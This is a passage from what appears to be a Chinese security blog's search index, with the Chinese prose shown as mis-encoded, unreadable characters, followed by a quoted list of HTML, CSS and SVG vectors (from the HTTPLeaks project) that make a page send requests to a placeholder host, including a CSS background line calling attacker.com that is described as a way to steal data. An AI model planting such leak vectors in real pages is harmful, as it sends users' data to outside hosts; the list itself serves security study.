å®‰å…¨çš„é—®é¢˜åœ¨äºæƒé™çš„é—®é¢˜ï¼Œä¿¡ä»»çš„é—®é¢˜ï¼Œä»¥å‰æˆ‘æ€»æ˜¯æƒ³ï¼Œè°éƒ½åœ¨ææ¼æ´æŒ–æ˜ï¼Œé‚£æœ‰ä¸€å¤©æ´æŒ–å®Œäº†å’±æ˜¯ä¸æ˜¯å°±æ²¡é¥­åƒäº†å•Šã€‚ã€‚ã€‚ã€‚ç°åœ¨æƒ³æƒ³ï¼Œçš„ç¡®ï¼Œéšç€å®‰å…¨ç ”ç©¶çš„åŠ æ·±ï¼Œä»¥å‰çš„ä¼ ç»Ÿå‹æ¼æ´é˜²å¾¡ä¼šè¶Šæ¥è¶Šå¤šï¼Œwafä¼šè¶Šæ¥è¶Šå˜æ€ã€‚ä½†æ¼æ´ç»å¯¹ä¸ä¼šè¶Šæ¥è¶Šå°‘ï¼Œè€Œæ˜¯ä¼šéšç€å®‰å…¨åšå¼ˆçš„åŠ å‰§ï¼Œè€Œè¶Šæ¥è¶Šå¤šï¼Œä¼šéšç€æ›´å¤šçš„åº”ç”¨ï¼Œæ›´å¤šçš„åè®®è€Œè¶Šæ¥è¶Šå¤šã€‚å®‰å…¨ä¸æ˜¯ç ”ç©¶æŠ€å·§çš„å­¦ç§‘è€Œæ˜¯ç ”ç©¶è‰ºæœ¯çš„å­¦ç§‘ï¼Œè€Œä¸”æˆ‘è®¤ä¸ºéšç€å‚å•†çš„é‡è§†ï¼Œè¿™ä¸ªåœˆå­çš„ç”Ÿæ€ä¼šè¶Šæ¥è¶Šå¥½</p></blockquote><pre><code class="hljs vbnet">Security <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> a tech,it<span class="hljs-comment">'s an art.</span></code></pre><h3 id="Http-Leek"><a href="#Http-Leek" class="headerlink" title="Http-Leek"></a>Http-Leek</h3><pre><code class="hljs xml">https://github.com/cure53/HTTPLeaks/blob/master/leak.html<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">    <span class="hljs-keyword">@import</span> <span class="hljs-string">'https://leaking.via/css-import-string'</span>;</span><span class="css">    <span class="hljs-keyword">@import</span> url(<span class="hljs-attribute">https:</span>//leaking.via/css-import-url);</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">&#123;<span class="hljs-attribute">background</span>:<span class="hljs-built_in">url</span>(http://attacker.com/x)&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.1"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">"http://www.w3.org/1999/xlink"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">feImage</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">"https://leaking.via/svg-feimage"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"alternate stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-alternate-stylesheet"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/1999/xhtml"</span> <span class="hljs-attr">manifest</span>=<span class="hljs-string">"https://leaking.via/html-manifest"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">profile</span>=<span class="hljs-string">"https://leaking.via/head-profile"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-stylesheet"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-icon"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"canonical"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-canonical"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"shortcut icon"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-shortcut-icon"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"import"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-import"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"dns-prefetch"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-dns-prefetch"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preconnect"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-preconnect"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"prefetch"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-prefetch"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-preload"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"prerender"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-prerender"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"font"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-preload-as-font"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"image"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-preload-as-image"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"image"</span> <span class="hljs-attr">imagesrcset</span>=<span class="hljs-string">",,,,,https://leaking.via/link-preload-imagesrcset"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"style"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-preload-as-style"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"script"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-preload-as-script"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"search"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-search"</span> /&gt;</span></code></pre><p>å…¶ä¸­</p><pre><code class="hljs">&lt;style&gt;&#123;background:url(http://attacker.com/x)&#125;&lt;/style&gt;</code></pre><p>è¿™ä¸ªå°±æ˜¯Sm1leå¸ˆå‚…è¯´çš„cssé€‰æ‹©å™¨çªƒå–æ•°æ®çš„æ–¹æ³•</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¼æ´æŒ–æ˜</tag>
      
      <tag>webå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
